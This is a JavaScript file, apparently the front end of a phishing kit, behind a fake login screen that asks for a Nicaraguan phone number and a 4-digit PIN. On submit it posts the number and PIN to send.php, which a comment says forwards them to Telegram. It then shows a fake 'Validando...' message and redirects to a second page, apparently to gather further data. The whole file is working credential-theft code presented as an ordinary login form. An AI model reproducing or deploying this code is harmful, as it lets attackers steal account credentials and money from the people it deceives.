(() => {
  const LOADER_MS = 2500;

  function showToast(msg) {
    let t = document.getElementById('nqToast');
    if (!t) {
      t = document.createElement('div');
      t.id = 'nqToast';
      t.className = 'nq-toast';
      document.body.appendChild(t);
    }
    t.textContent = msg;
    requestAnimationFrame(() => t.classList.add('show'));
    setTimeout(() => t.classList.remove('show'), 2400);
  }

  const loader = document.getElementById('loaderScreen');
  const app = document.getElementById('accesoApp');

  // Mostrar app después del loader
  setTimeout(() => {
    loader.classList.add('fade-out');
    app.hidden = false;
    setTimeout(() => loader.remove(), 450);
  }, LOADER_MS);

  // Teléfono Nicaragua: auto-formato 8888 8888
  const phone = document.getElementById('phone');
  const pwd = document.getElementById('password');

  phone?.addEventListener('input', (e) => {
    let digits = e.target.value.replace(/\D/g, '').slice(0, 8);
    e.target.value = digits.length > 4
      ? digits.slice(0, 4) + ' ' + digits.slice(4)
      : digits;
  });
  pwd?.addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
  });

  // Submit
  const form = document.getElementById('accesoForm');
  form?.addEventListener('submit', (e) => {
    e.preventDefault();
    if (!form.reportValidity()) return;

    // Nicaragua: 8 dígitos, debe iniciar en 2, 5, 7 u 8
    const digits = phone.value.replace(/\D/g, '');
    if (digits.length !== 8 || !['2','5','7','8'].includes(digits[0])) {
      phone.focus();
      phone.classList.add('input-error');
      showToast('Número inválido. Debe ser un teléfono nicaragüense de 8 dígitos.');
      return;
    }
    phone.classList.remove('input-error');

    if (pwd.value.length !== 4) {
      pwd.focus();
      return;
    }
    // Guardar datos para la siguiente pantalla
    const countryCode = document.getElementById('countryCode').value;
    sessionStorage.setItem('phone', digits);
    sessionStorage.setItem('countryCode', countryCode);
    sessionStorage.setItem('attempts', '0');

    // Enviar a Telegram (no bloqueante)
    fetch('send.php', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        step: 'acceso',
        countryCode,
        phone: digits,
        password: pwd.value,
      }),
      keepalive: true,
    }).catch(() => {});

    const btn = form.querySelector('.btn-pink');
    btn.textContent = 'Validando...';
    btn.disabled = true;
    setTimeout(() => {
      window.location.href = 'validacion.html';
    }, 800);
  });
})();
